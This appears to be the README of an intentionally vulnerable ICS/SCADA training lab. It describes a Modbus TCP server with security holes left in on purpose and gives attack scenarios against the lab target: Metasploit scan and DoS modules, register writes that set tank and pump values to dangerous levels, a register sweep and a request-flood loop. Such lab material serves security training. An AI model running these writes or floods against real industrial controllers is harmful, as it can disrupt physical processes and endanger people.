# Modbus TCP Implementation

## Overview

This document describes the **real** Modbus TCP server implementation that was added to the Vuln-PLC project. The previous version only had HTTP endpoints that pretended to be Modbus - now there's an actual TCP socket server listening on port 5502.

## What Was Added

### 1. Modbus TCP Server (`core/app.py`)

A complete Modbus TCP server implementation with:

- **Raw TCP socket server** on port 5502
- **MBAP header parsing** (Modbus Application Protocol)
- **Multi-threaded client handling**
- **Integration with shared_state** for process simulation

### 2. Supported Function Codes

| Function Code | Name | Purpose | Implemented |
|---------------|------|---------|-------------|
| 0x03 | Read Holding Registers | Read multiple register values | ✅ |
| 0x06 | Write Single Register | Write one register | ✅ |
| 0x10 | Write Multiple Registers | Write multiple registers | ✅ |

### 3. Register Mapping (`core/shared_state.py`)

Modbus registers are mapped to process state variables:

| Register | Variable | Type | Scale | Description |
|----------|----------|------|-------|-------------|
| 0 | tank1_level | float | ×10 | Tank 1 level (0-100%) |
| 1 | tank1_temp | float | ×10 | Tank 1 temperature (°C) |
| 2 | tank1_pressure | float | ×10 | Tank 1 pressure (kPa) |
| 3 | tank2_level | float | ×10 | Tank 2 level (0-100%) |
| 4 | tank2_temp | float | ×10 | Tank 2 temperature (°C) |
| 5 | tank2_pressure | float | ×10 | Tank 2 pressure (kPa) |
| 6 | pump1_speed | int | 1 | Pump 1 speed (RPM) |
| 7 | pump2_speed | int | 1 | Pump 2 speed (RPM) |
| 8 | pump3_speed | int | 1 | Pump 3 speed (RPM) |
| 9 | motor1_speed | int | 1 | Motor 1 speed (RPM) |
| 10 | motor2_speed | int | 1 | Motor 2 speed (RPM) |
| 11 | conveyor_speed | int | 1 | Conveyor speed |
| 12 | heater1_setpoint | float | ×10 | Heater setpoint (°C) |
| 13 | cooler1_setpoint | float | ×10 | Cooler setpoint (°C) |
| 14 | flow_rate | float | ×10 | Flow rate |
| 15 | vibration | float | ×10 | Vibration level |
| 16 | ph_level | float | ×10 | pH level |
| 17 | conductivity | float | ×10 | Conductivity |

**Note:** Float values are scaled by 10 in Modbus (e.g., 500 = 50.0)

## Architecture

```
┌──────────────────────────────────────────────┐
│              Flask Web App (5000)             │
│  ┌─────────────────────────────────────────┐ │
│  │     HTTP API / HMI Interface            │ │
│  └─────────────┬───────────────────────────┘ │
│                │                              │
└────────────────┼──────────────────────────────┘
                 │
                 ▼
         ┌───────────────┐
         │ Shared State  │◄────────┐
         │ (JSON file)   │         │
         └───────────────┘         │
                 ▲                 │
                 │                 │
┌────────────────┼─────────────────┼──────────┐
│                │                 │          │
│  ┌─────────────┴────────┐  ┌────┴───────┐  │
│  │  Modbus TCP Server   │  │  Client    │  │
│  │  (Background Thread) │  │  Handler   │  │
│  │                      │  │  Threads   │  │
│  │  Port 5502           │  └────────────┘  │
│  └──────────────────────┘                  │
└─────────────────────────────────────────────┘
```

## Intentional Vulnerabilities

This is an **educational/training** project. The Modbus server has intentional vulnerabilities:

### 1. No Authentication
- Any client can connect
- No username/password required
- No IP allowlisting

### 2. No Authorization
- All registers are readable
- All registers are writable
- No role-based access control

### 3. No Input Validation
- No bounds checking on register addresses
- No validation of register counts
- No range checking on values

### 4. No Rate Limiting
- Can flood with requests
- No connection limits
- No throttling

### 5. No Audit Logging
- Writes are logged to console only
- No persistent audit trail for Modbus operations
- Cannot track who changed what

### 6. Protocol Issues
- No CRC validation
- Accepts malformed packets
- No protocol version checking

## Testing the Modbus Server

### Using modbus-cli

```bash
# Install modbus-cli (Rust-based tool)
cargo install modbus-cli

# Read holding registers (start=0, count=10)
modbus read 127.0.0.1:5502 0 10

# Write single register (address=0, value=1000)
modbus write 127.0.0.1:5502 0 1000

# Write multiple registers
modbus write 127.0.0.1:5502 0 500 250 1013
```

### Using Python Test Script

```bash
# Start the server in one terminal
docker-compose up plc1

# Run the test script in another terminal
python3 test_modbus_standalone.py
```

### Using pymodbus

```python
from pymodbus.client import ModbusTcpClient

# Connect to PLC
client = ModbusTcpClient('localhost', port=5502)
client.connect()

# Read holding registers
result = client.read_holding_registers(0, 10, unit=1)
print(f"Register values: {result.registers}")

# Write single register
client.write_register(0, 1000, unit=1)

# Write multiple registers
client.write_registers(0, [500, 250, 1013], unit=1)

client.close()
```

### Using Metasploit

```bash
# Scan for Modbus devices
use auxiliary/scanner/scada/modbusdetect
set RHOSTS 192.168.100.10
run

# Read Modbus registers
use auxiliary/scanner/scada/modbus_findunitid
set RHOSTS 192.168.100.10
run

# Write to registers (DoS/attack)
use auxiliary/dos/scada/modbus_write_register
set RHOSTS 192.168.100.10
set RPORT 5502
set DATA_ADDRESS 0
set DATA 9999
run
```

## Attack Scenarios

### 1. Unauthorized Control
```bash
# Set tank level to dangerous value (999.9%)
modbus write localhost:5502 0 9999
```

### 2. Process Manipulation
```bash
# Set all pump speeds to maximum
modbus write localhost:5502 6 9999 9999 9999
```

### 3. Emergency Stop Bypass
```bash
# Disable emergency stop via coils (not yet fully implemented)
# Currently through holding registers
```

### 4. Reconnaissance
```bash
# Scan all registers to map the system
for i in {0..100}; do
  modbus read localhost:5502 $i 1
done
```

### 5. Denial of Service
```bash
# Flood with requests
while true; do
  modbus write localhost:5502 0 $RANDOM &
done
```

## Differences from Previous Version

| Feature | Before | After |
|---------|--------|-------|
| **Protocol** | HTTP only | Real Modbus TCP |
| **Port 5502** | Not listening | Actively listening |
| **Transport** | Application layer | Transport layer (TCP) |
| **Tools** | curl/browser only | modbus-cli, pymodbus, Metasploit |
| **MBAP Header** | Not implemented | Fully implemented |
| **Function Codes** | Fake (HTTP routes) | Real (0x03, 0x06, 0x10) |
| **ICS Realism** | Low | High |

## Why This Matters

The previous implementation had an HTTP endpoint at `/api/modbus/raw` that **pretended** to be Modbus, but:

- Real Modbus tools couldn't connect to it
- No actual Modbus TCP protocol was implemented
- Port 5502 wasn't actually listening
- Training value was limited

With this implementation:

✅ Real Modbus tools work
✅ Realistic ICS/SCADA environment
✅ Better for pentesting practice
✅ Metasploit modules work
✅ Authentic protocol behavior

## Files Modified

1. **`core/app.py`**
   - Added socket, threading, struct imports
   - Implemented `ModbusTCPServer` class
   - Added `start_modbus_server()` function
   - Modified `if __name__ == '__main__'` to start Modbus before Flask

2. **`core/shared_state.py`** (already had register mapping)
   - Contains `REGISTER_MAP` and `COIL_MAP`
   - Provides conversion functions

3. **`test_modbus_standalone.py`** (new file)
   - Standalone test suite for Modbus functionality

## Running in Docker

```bash
# Build and start
docker-compose up --build plc1

# In another terminal, test Modbus
modbus read localhost:5502 0 10

# Or use Python
python3 -c "
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient('localhost', 5502)
client.connect()
result = client.read_holding_registers(0, 10)
print(result.registers)
"
```

## Console Output

When the server starts, you'll see:

```
[STARTUP] Starting Modbus TCP server...
[MODBUS] Server started on 0.0.0.0:5502
[MODBUS] Background thread started
[STARTUP] Starting Flask web interface...
```

When clients connect:

```
[MODBUS] Client connected from ('127.0.0.1', 54321)
[MODBUS] Request from ('127.0.0.1', 54321): Trans=1, Unit=1, PDU=030000000a
[MODBUS] Read Holding Registers: addr=0, count=10
[MODBUS] Response: 00010000001503014...
[MODBUS] Client ('127.0.0.1', 54321) disconnected
```

## Next Steps

Potential enhancements (optional):

1. **Add Coils support** - Function codes 0x01, 0x05, 0x0F
2. **Add Discrete Inputs** - Function code 0x02
3. **Add Input Registers** - Function code 0x04
4. **Implement exception codes properly**
5. **Add pcap capture for Modbus traffic**
6. **Create Modbus-specific exploits**

## References

- [Modbus TCP Specification](http://www.modbus.org/docs/Modbus_Messaging_Implementation_Guide_V1_0b.pdf)
- [modbus-cli GitHub](https://github.com/favalex/modbus-cli)
- [pymodbus Documentation](https://pymodbus.readthedocs.io/)
- [Metasploit SCADA Modules](https://www.rapid7.com/db/modules/?q=modbus)

## Credits

Implementation based on ChatGPT's architectural review and recommendations for adding real Modbus TCP protocol support to make this a more realistic ICS/SCADA training environment.
